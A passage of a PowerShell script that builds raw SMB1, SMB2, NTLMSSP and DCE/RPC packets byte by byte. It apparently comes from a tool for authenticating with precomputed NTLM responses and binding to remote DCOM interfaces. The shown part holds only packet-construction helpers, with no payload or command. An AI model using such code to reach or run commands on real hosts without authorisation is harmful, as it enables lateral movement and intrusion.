        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function Get-PacketSMBCloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function Get-PacketSMBTreeDisconnectRequest()
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function Get-PacketSMBLogoffAndXRequest()
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function Get-PacketSMB2Header()
    {
        param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
        $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function Get-PacketSMB2NegotiateProtocolRequest()
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function Get-PacketSMB2SessionSetupRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function Get-PacketSMB2TreeConnectRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function Get-PacketSMB2CreateRequestFile()
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function Get-PacketSMB2ReadRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function Get-PacketSMB2WriteRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function Get-PacketSMB2CloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function Get-PacketSMB2TreeDisconnectRequest()
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function Get-PacketSMB2SessionLogoffRequest()
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function Get-PacketNTLMSSPNegotiate()
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function Get-PacketNTLMSSPAuth()
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function Get-PacketRPCBind()
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
        $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
        $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
        $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function Get-PacketRPCRequest()
    {
